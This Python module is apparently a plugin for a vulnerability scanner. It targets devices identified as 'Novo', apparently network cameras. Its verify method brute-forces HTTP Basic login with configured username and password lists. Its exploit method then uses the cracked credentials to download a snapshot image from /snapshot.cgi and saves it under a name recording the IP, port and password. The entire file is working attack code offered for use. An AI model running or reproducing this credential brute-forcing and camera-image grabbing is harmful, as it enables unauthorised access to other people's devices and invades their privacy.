import requests

from loguru import logger

from .base import POCTemplate


class NovoWeakPassword(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['novo']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.medium
        self.desc = """"""
        self.headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}

    def verify(self, ip, port=80):
        for user in self.config.users:
            for password in self.config.passwords:
                try:
                    r = requests.get(
                        url=f"http://{ip}:{port}/",
                        auth=(user, password),
                        timeout=self.config.timeout,
                        headers=self.headers,
                        verify=False
                    )
                    if r.status_code == 200 and 'Novo' in r.text:
                        return ip, str(port), self.product, str(user), str(password), self.name
                except Exception as e:
                    logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, vul = results
        url = f"http://{ip}:{port}/snapshot.cgi"
        img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
        return self._snapshot(url, img_file_name, auth=(user, password))


POCTemplate.register_poc(NovoWeakPassword)